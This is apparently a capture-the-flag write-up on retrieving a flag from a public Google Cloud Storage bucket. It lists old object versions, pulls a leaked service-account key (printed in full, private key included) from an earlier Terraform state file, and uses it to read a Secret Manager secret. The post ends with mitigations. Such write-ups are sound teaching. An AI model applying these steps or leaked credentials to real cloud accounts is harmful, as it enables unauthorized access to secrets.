## Overview

A static site on a Google Cloud Storage (GCS) bucket hinted that infrastructure files were left behind. The goal: follow those crumbs to recover the flag.

![Initial landing page showing infrastructure hints](img/blog/hidden1.png)

## 1) Initial Recon

Landing page clearly teases leftover infra artifacts.

![HTML source revealing Terraform state file location](img/blog/hidden2.png)

## 2) View Source → Infra Clue

HTML comments reveal a Terraform state file left in `/infra/`.

![Terraform state file contents](img/blog/hidden3.png)

In checking out this file, nothing useful was provided. I tried looking for other files, to no avail.

![Dead end in infrastructure exploration](img/blog/hidden4.png)

This being a dead end, I started again with what I knew. I knew the URL was `storage.googleapis.com/hidden-state-prod-ctf-dc33`. I figured that could be a bucket tag, and went into cloudshell to check it out.
## 3) Enumerate the Bucket

List objects and object versions (important for recovering old, “cleaned” files):

```bash
gsutil ls gs://hidden-state-prod-ctf-dc33/ 
# gs://hidden-state-prod-ctf-dc33/index.html 
# gs://hidden-state-prod-ctf-dc33/infra/  
gsutil ls -a gs://hidden-state-prod-ctf-dc33/infra 
# gs://hidden-state-prod-ctf-dc33/infra/terraform.tfstate#1754460304936859 
# gs://hidden-state-prod-ctf-dc33/infra/terraform.tfstate#1754460305330281
```

So we fetched the older object version of the same file to see what it had for us.

## 4) Read the Older `terraform.tfstate`

```bash
gsutil cat gs://hidden-state-prod-ctf-dc33/infra/terraform.tfstate#1754460304936859
```

That version contained:

- A flag hint (flag in Secret Manager under `hidden-state-flag`)
- A leaked service account key (full JSON creds)

```json
{
  "lineage": "a1b2c3d4-e5f6-7890-1234-567890abcdef",
  "outputs": {
    "flag_hint": {
      "type": "string",
      "value": "The flag is stored in Secret Manager under the secret name 'hidden-state-flag'. Use this service account and authenticate with: gcloud auth activate-service-account --key-file=service_account_key.json. Then access the secret with: gcloud secrets versions access latest --secret=\"hidden-state-flag\" --project=hiddenstate-dc33. Note: This service account only has access to the specific 'hidden-state-flag' secret."
    },
    "infrastructure_status": {
      "type": "string",
      "value": "deployed"
    },
    "leaked_service_account_key": {
      "sensitive": true,
      "type": "string",
      "value": "{\n \"type\": \"service_account\",\n \"project_id\": \"hiddenstate-dc33\",\n \"private_key_id\": \"8cb4fcb80ee3a7b09a05bf8bc7ba4f067fd725f5\",\n \"private_key\": \"-----BEGIN PRIVATE KEY-----\\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC3xsk1gspvLfxg\\nhzkba394wduh0WjtZN9elWvnt6oH/JMPKhXaCwuMJHKj+bfaGWnqjmyOOad4le8y\\nmWDxAFWWzeoKI9/CPksiD7QdEqktJBzc++bPwLWjTqJ3N/Y7EsuHZaopf4/LpXBN\\nU6D6IGnnHOrRkmOqSnOY+oox5c0p8MGY3L9sfAKIafyfTt3QlLcdB1I5gBMUE+p+\\nbLj3m9t6SYHzmOLXJGt18TPB0R5EIVuxDN0aY/xYI0sJKeciEN66K7mVxlDETLZ4\\nQd9VAQrPrrpCE4sywSiaHcqYCsIeaEcPB9dY4ZuLs0uhxhOaeLCNZIb3VpGAF/ct\\nBGtw0LXzAgMBAAECggEAPvqNm5vtubodogrVJDNrpLtyg/rapXgLIEO+jdMgHsqM\\nrwayJF3ioC0haFY8ji5lYK9cPkU9whJHvaRYV17Q9fQs/zqaBNwKLWsKQ2hQt5qH\\nladxysJ0vLlG7eospMPlIcpSTRRc9+IDIUzGftE62avMQPOU2hfXk5ZQY5cn/vXg\\niZLnZRGTMohzPcfupxRWUXOg0UGRcnOVr7OzOV8i2ead24TRoPyf6VekZ20im79o\\nJ5rPZkQ//hjgquwDYS+KiNm79NH3vImyCcQTCWQwoLTEFm+VVcurRTzLJHiOu4gg\\nmc7UCIHs+y7bJCXoSw/bczVGmzF3i6cS35dJdZKZ+QKBgQDrW7U64Xto85o1ycKn\\nWjgePXNzsPzfV7iFYeohXKEHb9fl29vSG5QaeHSlpYJ/vb5LNpAlnYMX7SNM+k9a\\n4jpuaJRQUUhkelVHS4vUHtDlIrLueiO/XNoDFD6x1++AgXpXWfyOVS1OzF1URmP+\\nDJKH03TS3a5Z1Aqqketr0ehdPwKBgQDH5PVxvFXqP2IupkakeDhD9OHSJPQEVDgx\\n1mHA+zaw4DfeEORGUchF42xTlAgEJ966dBfOK4fySTpAyZOz0qbgM9C8mJRwsE8m\\no/M17Zl7HtPqM5DH0aa1tzQjDTuDCibktVXm5FYBY+7Ff+o5MqnSG6XX0WO0KmjB\\nVK/ef4bWTQKBgBnJ4bDC9i/IyXPtWJvXweBmYVki4oJibUCIOwxOxwI2mhSAo7SA\\n+xhvbHCeEw+GLey13NOST8P2YvDTWJCfy0E/ykiGr4T69o8qUvb6LW99/tcsoPAd\\n73F47Wm1PHP7O/mITakW4jEJKYzLbbdvjzq8y8czLSCAoG6SMJaO2IQnAoGBAKPP\\nAzyDRDzEWGc2J6ncQu+dm/kkAzwQ8EQXFOCafUURWXcHjKn7lw1+w2TyaGdPbPyK\\n6n8vuSZZz/0Ls5inRc1xaNtEhlCaiyJ1NHe7EA2PQ8YnH7xAGEfNrFIVI/HMvfaq\\ni4y9DaXyCNecbYsV84iU06E6nGQmZNYZ2k2RYCP5AoGBAIEHw7LEmvZYSbfdTuwS\\n3jQJu5C1v99W2xD2QQferggQjb9qmaZisfhrTeeTFJUfsj6/pSCXmumwcxmicg3h\\nTI/iPOnEOt2/koCiBz26iG/O3/pxKYlwDRzJ6cZfRJp85qgEw5t2/WGRP0dGSlJJ\\npovb0mLmR1FPjUD52KClH3mV\\n-----END PRIVATE KEY-----\\n\",\n \"client_email\": \"ctf-leaky-sa@hiddenstate-dc33.iam.gserviceaccount.com\",\n \"client_id\": \"101443721771953202426\",\n \"auth_uri\": \"https://accounts.google.com/o/oauth2/auth\",\n \"token_uri\": \"https://oauth2.googleapis.com/token\",\n \"auth_provider_x509_cert_url\": \"https://www.googleapis.com/oauth2/v1/certs\",\n \"client_x509_cert_url\": \"https://www.googleapis.com/robot/v1/metadata/x509/ctf-leaky-sa%40hiddenstate-dc33.iam.gserviceaccount.com\",\n \"universe_domain\": \"googleapis.com\"\n}\n"
    }
  },
  "resources": [],
  "serial": 1,
  "terraform_version": "1.2.0",
  "version": 4
}
```

## 5) Extract & Save the Leaked Service Account Key

Save the JSON from the state into `service_account_key.json`.

Since it was throwing some json format errors due to having unneeded data, and in challenges like this I am allergic to JSON, I had ChadGPT fix it.

![Service account key extraction and formatting](img/blog/hidden5.png)

I saved this newly formatted service account key for gcloud CLI to access.

## 6) Auth as the Leaked Service Account & Pull the Secret

Use the key to authenticate and then access Secret Manager:

```bash
gcloud auth activate-service-account --key-file=service_account_key.json  
gcloud secrets versions access latest \
          --secret="hidden-state-flag" \   
             --project=hiddenstate-dc33 

# FLAG-{bvpkm3ed5onOA4dXSYGPMPfbpA7cfob0}`
```

## Takeaways / Mitigations
        
- **Object versioning ≠ deletion**: old versions remain retrievable unless explicitly pruned.
    
- **Bucket ACLs & IAM**: lock buckets down; don’t expose infra buckets publicly.
    
- **CI/CD hygiene**: pre-deploy checks to prevent publishing `/infra/` or state files.